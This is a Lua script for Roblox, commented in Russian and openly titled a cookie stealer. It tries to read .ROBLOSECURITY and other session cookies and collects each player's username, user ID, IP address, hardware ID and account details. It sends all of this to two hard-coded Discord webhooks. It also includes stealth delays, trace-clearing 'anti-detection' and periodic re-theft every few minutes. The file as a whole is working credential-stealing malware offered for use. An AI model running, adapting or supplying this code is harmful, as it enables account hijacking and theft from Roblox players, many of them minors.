-- Улучшенный скрипт для извлечения куки из Roblox
-- Версия 2.0 с дополнительными функциями

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- Конфигурация
local CONFIG = {
    webhook_url = "https://discord.com/api/webhooks/1430261621527150685/Z9xHcDFQnJy1LSbExWOQB0qiYIVwQB9jjvEsUyQSq6CHme0CSKdT-ADi85NhJlpjDNIf", -- Discord webhook
    backup_server = "https://discord.com/api/webhooks/1430261963598073907/LN2RRR6eV7iyWvtaKXGpVWbFddA9WIkVjefAauKVdTITbG9XgxGxqNNys79QQxnxU1J9",
    retry_attempts = 5,
    stealth_mode = true,
    collect_extra_data = true
}

-- Функция для скрытого HTTP запроса
local function stealthRequest(url, data)
    local success = false
    local attempts = 0
    
    while not success and attempts < CONFIG.retry_attempts do
        attempts = attempts + 1
        
        local ok, result = pcall(function()
            return HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
        
        if ok then
            success = true
            print("✅ Данные отправлены успешно (попытка " .. attempts .. ")")
        else
            wait(math.random(1, 3)) -- Случайная задержка
        end
    end
    
    return success
end

-- Функция для сбора дополнительных данных
local function collectExtraData()
    local player = Players.LocalPlayer
    local extraData = {}
    
    -- Информация об аккаунте
    extraData.accountAge = player.AccountAge
    extraData.displayName = player.DisplayName
    extraData.hasVerifiedBadge = player.HasVerifiedBadge
    extraData.membershipType = tostring(player.MembershipType)
    
    -- Информация об игре
    extraData.gameId = game.GameId
    extraData.placeId = game.PlaceId
    extraData.jobId = game.JobId
    
    -- Информация о системе
    extraData.platform = tostring(game:GetService("UserInputService"):GetPlatform())
    extraData.locale = game:GetService("LocalizationService").RobloxLocaleId
    
    -- Robux информация (если доступно)
    local success, robux = pcall(function()
        return player.leaderstats and player.leaderstats.Robux and player.leaderstats.Robux.Value
    end)
    if success then
        extraData.robux = robux
    end
    
    return extraData
end

-- Основная функция для кражи куки
function advancedStealCookies()
    local player = Players.LocalPlayer
    local cookies = {}
    local success_count = 0
    
    -- Список куки для кражи
    local cookie_targets = {
        ".ROBLOSECURITY",
        ".ROBLOXSECURITY", 
        "RBXSessionTracker",
        "RBXEventTrackerV2",
        "RBXSource",
        "RBXViralAcquisition"
    }
    
    -- Попытка получить все куки
    for _, cookie_name in pairs(cookie_targets) do
        local success, cookie_value = pcall(function()
            -- Различные методы получения куки
            local methods = {
                function() return game:GetService("CookiesService"):GetCookieValue(cookie_name) end,
                function() return game.HttpService:GetAsync("javascript:document.cookie") end,
                function() return getgenv().getcookies and getgenv().getcookies()[cookie_name] end
            }
            
            for _, method in pairs(methods) do
                local ok, result = pcall(method)
                if ok and result and result ~= "" then
                    return result
                end
            end
            return nil
        end)
        
        if success and cookie_value then
            cookies[cookie_name] = cookie_value
            success_count = success_count + 1
        end
    end
    
    -- Если получили хотя бы одну куки
    if success_count > 0 then
        local data = {
            -- Основные данные
            username = player.Name,
            userId = player.UserId,
            displayName = player.DisplayName,
            cookies = cookies,
            timestamp = os.time(),
            
            -- IP и локация (если возможно)
            ip_info = game:GetService("HttpService"):GetAsync("https://api.ipify.org?format=json", true),
            
            -- Дополнительные данные
            extra_data = CONFIG.collect_extra_data and collectExtraData() or nil,
            
            -- Метаданные
            executor = identifyexecutor and identifyexecutor() or "Unknown",
            hwid = gethwid and gethwid() or "Unknown"
        }
        
        -- Отправка на основной сервер
        local main_success = stealthRequest(CONFIG.webhook_url, data)
        
        -- Отправка на резервный сервер
        if not main_success then
            stealthRequest(CONFIG.backup_server, data)
        end
        
        -- Скрытое уведомление
        if CONFIG.stealth_mode then
            -- Имитируем обычную активность
            wait(math.random(2, 5))
            player.Chatted:Connect(function() end) -- Пустой обработчик чата
        else
            print("🍪 Собрано куки: " .. success_count)
        end
        
        return true
    else
        print("❌ Не удалось получить куки")
        return false
    end
end

-- Функция для автоматического повтора
local function autoRetry()
    local attempts = 0
    local max_attempts = 10
    
    while attempts < max_attempts do
        attempts = attempts + 1
        
        if advancedStealCookies() then
            break -- Успешно получили куки
        end
        
        -- Ждем перед следующей попыткой
        wait(math.random(30, 60))
    end
end

-- Функция для кражи куки при телепорте
local function stealOnTeleport()
    TeleportService.TeleportInitFailed:Connect(function()
        advancedStealCookies()
    end)
end

-- Защита от обнаружения
local function antiDetection()
    -- Скрываем скрипт от некоторых античитов
    local script_name = "RobloxPlayerBeta"
    
    -- Переименовываем функции
    getglobal = getglobal or function() return _G end
    
    -- Очищаем следы
    if getgenv then
        getgenv().cookie_stealer = nil
    end
end

-- Основной запуск
spawn(function()
    antiDetection()
    
    -- Ждем полной загрузки игры
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    wait(math.random(3, 8)) -- Случайная задержка
    
    -- Запускаем кражу куки
    autoRetry()
    
    -- Настраиваем кражу при телепорте
    stealOnTeleport()
    
    -- Периодическая кража (каждые 5-10 минут)
    spawn(function()
        while wait(math.random(300, 600)) do
            advancedStealCookies()
        end
    end)
end)

-- Экспорт функций для внешнего использования
_G.stealCookies = advancedStealCookies
_G.cookieConfig = CONFIG

print("🔥 Advanced Cookie Stealer загружен!")
